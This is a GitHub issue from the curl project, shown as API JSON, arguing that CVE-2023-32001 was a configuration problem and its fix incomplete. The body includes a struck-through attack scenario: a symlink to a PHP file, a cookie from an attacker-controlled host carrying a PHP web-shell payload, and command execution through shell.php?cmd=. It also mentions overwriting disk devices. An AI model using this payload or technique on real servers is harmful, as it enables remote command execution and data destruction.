{"url":"https://api.github.com/repos/curl/curl/issues/11530","repository_url":"https://api.github.com/repos/curl/curl","labels_url":"https://api.github.com/repos/curl/curl/issues/11530/labels{/name}","comments_url":"https://api.github.com/repos/curl/curl/issues/11530/comments","events_url":"https://api.github.com/repos/curl/curl/issues/11530/events","html_url":"https://github.com/curl/curl/issues/11530","id":1824832821,"node_id":"I_kwDOAAiu0c5sxL01","number":11530,"title":"CVE-2023-32001 fix incomplete, but really not a vuln to begin with","user":{"login":"piru","id":1134152,"node_id":"MDQ6VXNlcjExMzQxNTI=","avatar_url":"https://avatars.githubusercontent.com/u/1134152?v=4","gravatar_id":"","url":"https://api.github.com/users/piru","html_url":"https://github.com/piru","followers_url":"https://api.github.com/users/piru/followers","following_url":"https://api.github.com/users/piru/following{/other_user}","gists_url":"https://api.github.com/users/piru/gists{/gist_id}","starred_url":"https://api.github.com/users/piru/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/piru/subscriptions","organizations_url":"https://api.github.com/users/piru/orgs","repos_url":"https://api.github.com/users/piru/repos","events_url":"https://api.github.com/users/piru/events{/privacy}","received_events_url":"https://api.github.com/users/piru/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":200869765,"node_id":"MDU6TGFiZWwyMDA4Njk3NjU=","url":"https://api.github.com/repos/curl/curl/labels/documentation","name":"documentation","color":"f7c6c7","default":true,"description":null}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":14,"created_at":"2023-07-27T17:10:50Z","updated_at":"2023-09-01T02:18:20Z","closed_at":"2023-08-27T09:16:52Z","author_association":"NONE","type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### I did this\r\n\r\nn.b. While this is security related, we already had discussion about this on HackerOne where we decided that this isn't something that needs to reside there.\r\n\r\nI argue that CVE-2023-32001 really wasn't a vulnerability. User of curl / libcurl must not hold any critical files in a directory that can be tampered by third-parties.\r\n\r\nThe argument behind the CVE-2023-32001 fix is that there is a race condition whereas the attacker can just switch the object type to allow overwriting files with the content that is being written with the function. However, for this to be a problem the attacker must be able to modify the directory to begin with.\r\n\r\nFirst, the \"security fix\" only prevents access to regular files. You can still make the victim write to non-regular files, such as devices or pipes. This can be used to denial of service by writing over the beginning of a disk label (`/dev/sdx` etc) when curl is executed as appropriately privileged user.\r\n\r\nSecond, this \"security fix\" only prevents writing to already existing files. You can write to non-existing files just fine. ~Let's assume a naive PHP web application running on a server which the attacker also has local low-privileged access to. Let's assume the web application executes as `www-data` user and has write access to the location where the php files are hosted. Let's also imagine a functionality whereas curl will fetch some content while holding cookies in some insecure location where the attacker can modify the directory (write access to the directory). Say, let the PHP application use `/opt/sillyapptmp/cookies.txt` to hold the cookies while using curl (`/opt/sillyapptmp` is writable for the attacker user, as described).~\r\n\r\n~The attacker then does:~\r\n ~- `ln -s /var/www/sillyapp/shell.php /opt/sillyapptmp/cookies.txt`~\r\n ~- The attacker triggers the target application to fetch URL `https://attacker.controlled/`~\r\n ~- The `https://attacker.controlled/` does `Set-Cookie: A=<?php passthru($_GET['cmd']); ?>`. Once curl is done it writes the cookies and follows the softlink to `/var/www/sillyapp/shell.php`~\r\n\r\n~Attacker can now execute arbitrary shell commands as `www-data` by invoking `https:///targetapp/shell.php?cmd=shellcommandhere`~\r\n\r\n~This works perfectly fine regardless of the supposed CVE-2023-32001 fix, if the original premise of the \"writable target directory\" holds.~\r\n\r\n_edited on 2022-08-21_: While the target file is created, the check for the file means that the file will remain empty. While unwanted behaviour, this makes it unlikely to useful for attacker in most cases.\r\n\r\nThis attack (and `CVE-2023-32001`) only works if curl is used in a way that the files written by `Curl_fopen` are held in an insecure directory. This is a configuration mistake, not a vulnerability in curl. I thereby argue that `CVE-2023-32001` really wasn't a vulnerability to begin with.\r\n\r\nNow, accidents like this can still happen due to misconfiguration. It is however very hard to prevent exploiting them from a curl library perspective. It can be debated if this should even be attempted.\r\n\r\n### I expected the following\r\n\r\nMaybe the documentation should be even more clear that this is not what curl / libcurl can defend against.\r\n\r\n### curl/libcurl version\r\n\r\ncurl 8.2.0\r\n\r\n### operating system\r\n\r\nAny","closed_by":{"login":"bagder","id":177011,"node_id":"MDQ6VXNlcjE3NzAxMQ==","avatar_url":"https://avatars.githubusercontent.com/u/177011?v=4","gravatar_id":"","url":"https://api.github.com/users/bagder","html_url":"https://github.com/bagder","followers_url":"https://api.github.com/users/bagder/followers","following_url":"https://api.github.com/users/bagder/following{/other_user}","gists_url":"https://api.github.com/users/bagder/gists{/gist_id}","starred_url":"https://api.github.com/users/bagder/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/bagder/subscriptions","organizations_url":"https://api.github.com/users/bagder/orgs","repos_url":"https://api.github.com/users/bagder/repos","events_url":"https://api.github.com/users/bagder/events{/privacy}","received_events_url":"https://api.github.com/users/bagder/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/curl/curl/issues/11530/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/curl/curl/issues/11530/timeline","performed_via_github_app":null,"state_reason":"completed"}